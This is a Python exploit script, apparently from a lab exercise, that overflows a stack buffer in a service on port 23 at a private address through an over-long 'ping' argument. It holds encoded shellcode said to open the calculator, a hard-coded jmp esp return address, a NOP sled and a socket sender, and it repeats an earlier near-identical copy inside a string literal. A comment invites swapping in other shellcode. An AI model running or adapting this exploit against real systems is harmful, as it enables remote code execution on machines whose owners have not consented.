'''import socket
from string import ascii_uppercase,ascii_lowercase,digits
import itertools

def send_buf(buffer,host='192.168.56.101',port=23):
  with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
    sock.connect((host,port))
    data = b'ping baidu.com'+b'\r\n'
    sock.send(data)
    sock.recv(1000)
    data = b'ping ' + buffer + b'\r\n'
    sock.send(data)
    sock.recv(1000)

#1.确定跳转位置    生成不重复的2000字符串
pattern = (''.join(map(''.join,itertools.product(ascii_uppercase,ascii_lowercase,digits))).encode())[:2000]

#2.打开计算器的shellcode
#可以用自己的shellcode
#shellcode1 =  b"\x33\xd2\x52\x52\x52\x52\xe8\xbe\xe9\x44\x7d"
shellcode1 = b"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
shellcode1 +=b"\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x49\x49\x51\x5a\x6a\x42"
shellcode1 +=b"\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x52\x32\x41\x42\x41\x32"
shellcode1 +=b"\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x38\x69\x79\x6c\x4a"
shellcode1 +=b"\x48\x67\x34\x47\x70\x77\x70\x53\x30\x6e\x6b\x67\x35\x45\x6c\x4c"
shellcode1 +=b"\x4b\x73\x4c\x74\x45\x31\x68\x54\x41\x68\x6f\x6c\x4b\x70\x4f\x57"
shellcode1 +=b"\x68\x6e\x6b\x71\x4f\x45\x70\x65\x51\x5a\x4b\x67\x39\x4c\x4b\x50"
shellcode1 +=b"\x34\x4c\x4b\x77\x71\x68\x6e\x75\x61\x4b\x70\x4e\x79\x6e\x4c\x4d"
shellcode1 +=b"\x54\x4b\x70\x72\x54\x65\x57\x69\x51\x49\x5a\x46\x6d\x37\x71\x6f"
shellcode1 +=b"\x32\x4a\x4b\x58\x74\x77\x4b\x41\x44\x44\x64\x35\x54\x72\x55\x7a"
shellcode1 +=b"\x45\x6c\x4b\x53\x6f\x51\x34\x37\x71\x48\x6b\x51\x76\x4c\x4b\x76"
shellcode1 +=b"\x6c\x50\x4b\x6e\x6b\x71\x4f\x67\x6c\x37\x71\x68\x6b\x4c\x4b\x65"
shellcode1 +=b"\x4c\x4c\x4b\x64\x41\x58\x6b\x4b\x39\x53\x6c\x75\x74\x46\x64\x78"
shellcode1 +=b"\x43\x74\x71\x49\x50\x30\x64\x6e\x6b\x43\x70\x44\x70\x4c\x45\x4f"
shellcode1 +=b"\x30\x41\x68\x44\x4c\x4e\x6b\x63\x70\x44\x4c\x6e\x6b\x30\x70\x65"
shellcode1 +=b"\x4c\x4e\x4d\x6c\x4b\x30\x68\x75\x58\x7a\x4b\x35\x59\x4c\x4b\x4d"
shellcode1 +=b"\x50\x58\x30\x37\x70\x47\x70\x77\x70\x6c\x4b\x65\x38\x57\x4c\x31"
shellcode1 +=b"\x4f\x66\x51\x48\x76\x65\x30\x70\x56\x4d\x59\x4a\x58\x6e\x63\x69"
shellcode1 +=b"\x50\x31\x6b\x76\x30\x55\x38\x5a\x50\x4e\x6a\x36\x64\x63\x6f\x61"
shellcode1 +=b"\x78\x6a\x38\x4b\x4e\x6c\x4a\x54\x4e\x76\x37\x6b\x4f\x4b\x57\x70"
shellcode1 +=b"\x63\x51\x71\x32\x4c\x52\x43\x37\x70\x42"
#jmp esp
retaddr = bytes.fromhex('7ffa4512')[::-1]

#  pattern.find(bytes.fromhex('68423768')[::-1])

buf = ((b"\x90" *4 + shellcode1).ljust(1012,b"\x90") + retaddr).ljust(2000,b"\x90")


send_buf(buf,host='192.168.56.101',port=23)

'''
import socket
from string import ascii_uppercase,ascii_lowercase,digits
import itertools

def send_buf(buffer,host='192.168.56.101',port=23):
  with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
    sock.connect((host,port))
    data = b'ping ' + buffer + b'\r\n'
    sock.send(data)
    sock.recv(1000)

#1.确定跳转位置    生成不重复的2000字符串
pattern = (''.join(map(''.join,itertools.product(ascii_uppercase,ascii_lowercase,digits))).encode())[:2000]

#2.打开计算器的shellcode
#可以用自己的shellcode

shellcode1 = b"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
shellcode1 += b"\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x49\x49\x51\x5a\x6a\x42"
shellcode1 += b"\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x52\x32\x41\x42\x41\x32"
shellcode1 += b"\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x38\x69\x79\x6c\x4a"
shellcode1 += b"\x48\x67\x34\x47\x70\x77\x70\x53\x30\x6e\x6b\x67\x35\x45\x6c\x4c"
shellcode1 += b"\x4b\x73\x4c\x74\x45\x31\x68\x54\x41\x68\x6f\x6c\x4b\x70\x4f\x57"
shellcode1 += b"\x68\x6e\x6b\x71\x4f\x45\x70\x65\x51\x5a\x4b\x67\x39\x4c\x4b\x50"
shellcode1 += b"\x34\x4c\x4b\x77\x71\x68\x6e\x75\x61\x4b\x70\x4e\x79\x6e\x4c\x4d"
shellcode1 += b"\x54\x4b\x70\x72\x54\x65\x57\x69\x51\x49\x5a\x46\x6d\x37\x71\x6f"
shellcode1 += b"\x32\x4a\x4b\x58\x74\x77\x4b\x41\x44\x44\x64\x35\x54\x72\x55\x7a"
shellcode1 += b"\x45\x6c\x4b\x53\x6f\x51\x34\x37\x71\x48\x6b\x51\x76\x4c\x4b\x76"
shellcode1 += b"\x6c\x50\x4b\x6e\x6b\x71\x4f\x67\x6c\x37\x71\x68\x6b\x4c\x4b\x65"
shellcode1 += b"\x4c\x4c\x4b\x64\x41\x58\x6b\x4b\x39\x53\x6c\x75\x74\x46\x64\x78"
shellcode1 += b"\x43\x74\x71\x49\x50\x30\x64\x6e\x6b\x43\x70\x44\x70\x4c\x45\x4f"
shellcode1 += b"\x30\x41\x68\x44\x4c\x4e\x6b\x63\x70\x44\x4c\x6e\x6b\x30\x70\x65"
shellcode1 += b"\x4c\x4e\x4d\x6c\x4b\x30\x68\x75\x58\x7a\x4b\x35\x59\x4c\x4b\x4d"
shellcode1 += b"\x50\x58\x30\x37\x70\x47\x70\x77\x70\x6c\x4b\x65\x38\x57\x4c\x31"
shellcode1 += b"\x4f\x66\x51\x48\x76\x65\x30\x70\x56\x4d\x59\x4a\x58\x6e\x63\x69"
shellcode1 += b"\x50\x31\x6b\x76\x30\x55\x38\x5a\x50\x4e\x6a\x36\x64\x63\x6f\x61"
shellcode1 += b"\x78\x6a\x38\x4b\x4e\x6c\x4a\x54\x4e\x76\x37\x6b\x4f\x4b\x57\x70"
shellcode1 += b"\x63\x51\x71\x32\x4c\x52\x43\x37\x70\x42"

#jmp esp
retaddr = bytes.fromhex('7ffa4512')[::-1]

#  pattern.find(bytes.fromhex('68423768')[::-1])

buf = ((b"\x90" *4 + shellcode1).ljust(1012,b"\x90") + retaddr).ljust(2000,b"\x90")

send_buf(buf)

